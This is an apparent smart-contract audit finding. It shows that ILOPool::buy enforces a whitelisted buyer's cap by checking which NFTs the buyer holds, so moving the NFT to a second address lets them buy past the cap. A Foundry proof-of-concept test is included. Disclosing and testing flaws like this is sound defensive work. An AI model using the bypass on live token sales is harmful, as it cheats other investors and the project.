# Vulnerability details


The ILOPool::buy function calculates the raised amount of tokens by user by checking the ERC721 token that they own and checking the amount raised assigned to the nft. 
When a whitelist is used and every user has their max cap set, a whitelisted user can bypass their user cap by buying for the amount equal to the maxCapPerUser then transfering their nft to another 
address which they control (address they generated and they know its private key).
After transferring the nft user can call the function again, 
the contract would check nft they own and then, because user address does not own any nfts assume that user did not buy anything and allow them to buy more positions. 
User can repeat that process until the sale reaches the hard cap.
After their purchases they can transfer their nft position back to themselves and claim them after the pool launches.
Especially during scenario where the sale is whitelisted, user could buy a large portion of liquidity positions thus owning the amount of liquidity 
that was not intended to be sold one the user by the contract.
In scenario where there is e.g 10 whitelisted users, hard Cap - 10 tokens and maxCapPerUser 1 token, malicious user could buy for all 10 tokens thus other users cannot buy.


## Proof of Concept
The next test added to the ILOPool.t.sol file could show a scenario when the user bypasses their maxCapPerUser:
```
 /// cap set to 60000 ether
    function testExceedMaxPerCap() external {
        //Setup a whitelist where INVESTOR address is whitelisted
        vm.prank(PROJECT_OWNER);
        IILOWhitelist(iloPool).batchWhitelist(_getListAddressFromAddress(INVESTOR));

        //Investor approves pool so they can buy in ILOPool
        _writeTokenBalance(USDC, INVESTOR, 1000000000 ether);
        vm.prank(INVESTOR);
        IERC20(USDC).approve(iloPool, 1000000000 ether);

        //We change time to a time when the sale is active
        vm.warp(SALE_START+1);
        vm.prank(INVESTOR); 
        // Investor buys 60000 which is a max amount per user and gets minted an nft 
        IILOPool(iloPool).buy(60000 ether, INVESTOR);
        address ownerOfToken_1 = ERC721(iloPool).ownerOf(1);
        assertEq(ownerOfToken_1, INVESTOR);

        // When the whitelisted investor tries to buy more, contract declines because they would exceed the cap
        vm.prank(INVESTOR);
        vm.expectRevert(bytes("UC"));
        IILOPool(iloPool).buy(1 ether, INVESTOR);

        // Investor transfers the nft to their another address that they control
        vm.prank(INVESTOR);
        ERC721(iloPool).transferFrom(INVESTOR, DUMMY_ADDRESS, 1);
        
        // Now they can successfully buy more tokens exceeding their cap 
        vm.prank(INVESTOR); 
        IILOPool(iloPool).buy(40000 ether, INVESTOR);
        // Investor can do that until the hard cap for the whole sale is reached
        // So the investor can exceed their user cap and buy all available liquidity in the sale

        //Investor can transfer from their other address back their nft to their address
        vm.prank(DUMMY_ADDRESS);
        ERC721(iloPool).transferFrom(DUMMY_ADDRESS, INVESTOR, 1);
    }
```

## Impact
User can buy for more that was intended to be sold to one user by the contract.

## Recommended Mitigation Steps
Implement a register that counts for how much a user has purchased in a diffrent way than by checking user tokens.
